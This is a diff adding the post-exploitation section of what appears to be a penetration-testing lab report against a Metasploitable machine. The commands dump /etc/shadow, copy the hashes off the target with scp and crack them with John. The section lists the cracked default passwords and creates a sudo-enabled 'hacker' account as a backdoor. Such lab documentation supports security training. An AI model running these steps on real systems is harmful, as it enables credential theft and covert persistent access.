@@ -1,0 +1,49 @@
+ Phase 3 – Post-Exploitation
+
+Objective:
+
+The goal of this phase was to assess the depth of access gained and determine what further actions an attacker could take after initial compromise.
+
+Identity Confirmation:
+
+      whoami
+      id
+      uname -a
+
+Dump Password Hashes:
+
+      cat /etc/shadow > /home/msfadmin/hashes.txt
+      scp msfadmin@192.168.56.102:/home/msfadmin/hashes.txt .
+
+Crack Hashes with John:
+
+      john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Cracked Passwords:
+
+      Username                  Password
+      
+      user                        user
+      
+    
+      service                    service
+      
+      
+      postgres                   postgres
+      
+      
+     
+      msfadmin                   msfadmin
+      
+      
+      klog                        123456789
+      
+     
+      sys                          batman
+      
+     
+
+Persistence:
+      sudo useradd hacker -m -s /bin/bash
+      sudo passwd hacker
+      sudo usermod -aG sudo hacker
